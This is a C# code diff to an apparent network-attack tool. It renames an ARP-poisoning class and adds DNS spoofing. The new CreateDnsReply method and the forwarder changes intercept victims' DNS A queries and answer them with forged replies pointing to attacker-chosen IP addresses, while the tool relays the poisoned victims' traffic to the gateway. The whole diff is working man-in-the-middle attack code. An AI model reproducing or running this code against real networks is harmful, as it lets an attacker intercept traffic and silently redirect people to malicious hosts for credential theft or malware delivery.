@@ -16,10 +16,11 @@ using PcapDotNet.Core.Extensions;
 using System.Net.NetworkInformation;
 using PcapDotNet.Packets.Transport;
 using DipW.Classes.Extensions;
+using PcapDotNet.Packets.Dns;
 
 namespace DipW.Classes.Manipulators
 {
-    public class ArpPoisoning
+    public class ArpPoisoner
     {
         private LivePacketDevice _device;
         private BackgroundWorker _bgWorker;
@@ -30,29 +31,45 @@ namespace DipW.Classes.Manipulators
 
         private Listener.Listener _forwardingListener;
 
+        private DNSspoofingList _dnsSpoofingList;
+
         public BackgroundWorker BgWorker
         {
             get { return _bgWorker; }
         }
 
+        public DNSspoofingList DnsSpoofingList
+        {
+            get { return _dnsSpoofingList; }
+        }
+
+        public bool IsDnsSpoofingEnabled
+        {
+            get { return _dnsSpoofingList.Count > 0; }
+        }
+
         //constructors
-        public ArpPoisoning(LivePacketDevice device, Target Gateway)
+        public ArpPoisoner(LivePacketDevice device, Target Gateway)
         {
             _device = device;
+            _gateway = Gateway;
+            _ownMacAddr = _device.GetMacAddress();
+
             _bgWorker = new BackgroundWorker();
             _bgWorker.WorkerSupportsCancellation = true;
             _bgWorker.DoWork += new DoWorkEventHandler(DoWork);
+
             _targets = new List<Target>();
-            _gateway = Gateway;
-            _ownMacAddr = _device.GetMacAddress();
+            _dnsSpoofingList = new DNSspoofingList();
+
             _forwardingListener = new Listener.Listener(device, "ip and ( udp or tcp) and ether dst " + _ownMacAddr.ToString() +
                 " and not host " + _device.getIpV4Address().Address.ToString());
-            _forwardingListener.StartCapture(HandlePacket);
+            _forwardingListener.StartCapture(Forwarder);
         }
 
-        public void HandlePacket(Packet packet)
+        //Forwards packets from the gateway to the victim and from the victim to the gateway
+        public void Forwarder(Packet packet)
         {
-            //var ip = packet.Ethernet.IpV4;
             using (PacketCommunicator communicator = _forwardingListener.Device.Open())
             {
 
@@ -72,7 +89,6 @@ namespace DipW.Classes.Manipulators
                 {
                     newMacDestination = new MacAddress(_gateway.MAC);
                 }
-
 
                 EthernetLayer ethernetLayer =
                     new EthernetLayer
@@ -98,17 +114,31 @@ namespace DipW.Classes.Manipulators
                 switch (ippacket.Protocol)
                 {
                     case IpV4Protocol.Udp:
-                        var updPacket = ippacket.Udp;
+
+                        var udpPacket = ippacket.Udp;
+
+                        //dns spoofing
+                        if (IsDnsSpoofingEnabled && udpPacket.DestinationPort == 53 && udpPacket.Dns.Queries[0].DnsType == DnsType.A)
+                        {
+                            try
+                            {
+                                var spoofingEntry = _dnsSpoofingList.First(x => x.DomainName == udpPacket.Dns.Queries[0].DomainName.ToString());
+                                communicator.SendPacket(CreateDnsReply(etherpacket, new IpV4Address(spoofingEntry.IP)));
+                                return;
+                            }
+                            catch { }
+                        }
+
                         UdpLayer udpLayer = new UdpLayer
                         {
-                            SourcePort = updPacket.SourcePort,
-                            DestinationPort = updPacket.DestinationPort,
+                            SourcePort = udpPacket.SourcePort,
+                            DestinationPort = udpPacket.DestinationPort,
                             Checksum = null, // Will be filled automatically.
                             CalculateChecksumValue = true
                         };
                         payloadLayer = new PayloadLayer
                         {
-                            Data = updPacket.Payload
+                            Data = udpPacket.Payload
                         };
                         builder = new PacketBuilder(ethernetLayer, ipLayer, udpLayer, payloadLayer);
                         break;
@@ -144,6 +174,54 @@ namespace DipW.Classes.Manipulators
             }
         }
 
+        public Packet CreateDnsReply(EthernetDatagram etherpacket, IpV4Address newAddress)
+        {
+            var ipPacket = etherpacket.IpV4;
+            var udpPacket = ipPacket.Udp;
+            var dnsPacket = udpPacket.Dns;
+
+            if (!dnsPacket.IsQuery)
+                throw new Exception("Packet should be a dns query!");
+
+            EthernetLayer ethernetLayer = new EthernetLayer
+            {
+                Source = etherpacket.Destination,
+                Destination = etherpacket.Source,
+            };
+
+            IpV4Layer ipLayer = new IpV4Layer
+            {
+                Source = ipPacket.Destination,
+                CurrentDestination = ipPacket.Source,
+            };
+
+            UdpLayer udpLayer = new UdpLayer
+            {
+                SourcePort = udpPacket.DestinationPort,
+                DestinationPort = udpPacket.SourcePort
+            };
+
+
+            DnsResourceData resourceData = new DnsResourceDataIpV4(newAddress);
+            DnsDataResourceRecord resourceRecord = new DnsDataResourceRecord(dnsPacket.Queries[0].DomainName,
+                    dnsPacket.Queries[0].DnsType,
+                    dnsPacket.Queries[0].DnsClass,
+                    60,
+                    resourceData);
+
+            DnsLayer dnsLayer = new DnsLayer
+            {
+                Queries = dnsPacket.Queries,
+                IsQuery = false,
+                IsResponse = true,
+                Id = dnsPacket.Id,
+                Answers = new[] { resourceRecord }
+            };
+
+            PacketBuilder builder = new PacketBuilder(ethernetLayer, ipLayer, udpLayer, dnsLayer);
+            return builder.Build(DateTime.Now);
+        }
+
         public void AddTarget(Target target)
         {
             lock (_targets)
@@ -160,10 +238,6 @@ namespace DipW.Classes.Manipulators
                 if (!_targets.Contains(target))
                 {
                     _targets.Remove(target);
-                    if (_targets.Count == 0 && _bgWorker.IsBusy)
-                    {
-                        _bgWorker.CancelAsync();
-                    }
                 }
             }
         }
